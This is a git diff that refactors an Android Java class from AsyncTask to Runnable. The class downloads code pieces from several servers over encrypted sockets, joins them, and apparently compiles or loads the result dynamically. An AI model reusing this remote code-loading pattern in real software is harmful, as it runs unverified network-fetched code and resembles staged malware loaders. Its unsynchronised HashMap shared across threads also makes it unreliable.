@@ -14,59 +14,59 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.Arrays;
 import java.util.HashMap;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 import java.util.logging.Logger;
 import java.util.regex.Pattern;
 
 import javassist.NotFoundException;
 
-class CompilationTask extends AsyncTask<String, Void, String> {
+class CompilationTask implements Runnable {
     private static final String TAG = "CompilationTask";
 
     private final Context context;
 
     private final String socketCollectorHostname;
     private final int socketCollectorPort;
+    private final String[] servers;
+    private final String resultType;
+    private final String arg;
 
     private CryptedSocket socketCollector;
 
     private final HashMap<Integer, String> pieces;
 
-    public CompilationTask(Context context, String socketCollectorHostname, int socketCollectorPort) {
+    public CompilationTask(Context context, String socketCollectorHostname, int socketCollectorPort, String[] servers, String resultType, String arg) {
         this.context = context;
         this.pieces = new HashMap<>();
 
         this.socketCollectorHostname = socketCollectorHostname;
         this.socketCollectorPort = socketCollectorPort;
+
+        this.servers = servers;
+        this.resultType = resultType;
+        this.arg = arg;
     }
 
     @Override
-    protected String doInBackground(String... args) {
-        String servers = args[0];
-        String resultType = args[1];
-        String arg = args[2];
-
-        String[] socketCodeSendersList = parseSocketCodeSenderList(servers);
-        Log.d("serversList", Arrays.toString(socketCodeSendersList));
-
-        resultType = resultType.split("Result Type: ")[1];
-        arg = arg.split("Arg: ")[1];
-
+    public void run() {
         try {
             //download phase
             long startDownloadPhase = System.nanoTime();
             this.pieces.clear();
-            for (int i = 0; i < socketCodeSendersList.length; i++) {
-                String[] codeSenderParams = socketCodeSendersList[i].split(":");
+            for (int i = 0; i < servers.length; i++) {
+                String[] codeSenderParams = servers[i].split(":");
 
-                DownloadTask task = new DownloadTask(codeSenderParams[0], Integer.parseInt(codeSenderParams[1]));
-                task.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, i);
+                DownloadTask task = new DownloadTask(codeSenderParams[0], Integer.parseInt(codeSenderParams[1]), i);
+                ExecutorService executor = Executors.newSingleThreadExecutor();
+                executor.execute(task);
             }
 
-            while (this.pieces.size() < socketCodeSendersList.length) {
+            while (this.pieces.size() < servers.length) {
                 Thread.sleep(100);
             }
             StringBuilder codeBuilder = new StringBuilder();
-            for (int i = 0; i < socketCodeSendersList.length; i++) {
+            for (int i = 0; i < servers.length; i++) {
                 codeBuilder.append(this.pieces.get(i));
             }
             String code = codeBuilder.toString();
@@ -141,29 +141,26 @@ class CompilationTask extends AsyncTask<String, Void, String> {
             e.printStackTrace();
         }
         this.socketCollector.close();
-        return "Done";
-    }
-
-    private String[] parseSocketCodeSenderList(String socketCodeSenderListString) {
-        return socketCodeSenderListString.substring(9).split(Pattern.quote("|"));
     }
 
 
-    class DownloadTask extends AsyncTask<Integer, Void, String> {
+    class DownloadTask implements Runnable {
         private static final String TAG = "DownloadTask";
-
-        private CryptedSocket socketCodeSender;
 
         private final String socketCodeSenderHostname;
         private final int socketCodeSenderPort;
+        private final int piecesNumber;
 
-        public DownloadTask(String socketCodeSenderHostname, int socketCodeSenderPort) {
+        private CryptedSocket socketCodeSender;
+
+        public DownloadTask(String socketCodeSenderHostname, int socketCodeSenderPort, int pieceNumber) {
             this.socketCodeSenderHostname = socketCodeSenderHostname;
             this.socketCodeSenderPort = socketCodeSenderPort;
+            this.piecesNumber = pieceNumber;
         }
 
         @Override
-        protected String doInBackground(Integer... integer) {
+        public void run() {
             try {
                 Log.d(TAG, "Starting downloadTask...");
 
@@ -171,7 +168,7 @@ class CompilationTask extends AsyncTask<String, Void, String> {
                 this.socketCodeSender.connect();
 
                 String piece = this.socketCodeSender.read();
-                pieces.put(integer[0], piece);
+                pieces.put(this.piecesNumber, piece);
 
                 this.socketCodeSender.close();
             } catch (IOException e) {
@@ -179,12 +176,6 @@ class CompilationTask extends AsyncTask<String, Void, String> {
                 this.socketCodeSender.close();
             }
             this.socketCodeSender.close();
-            return "Done";
-        }
-
-        @Override
-        protected void onPostExecute(String s) {
-            Log.d(TAG, "[Downloaded from SocketCodeSender...]");
         }
     }
 }
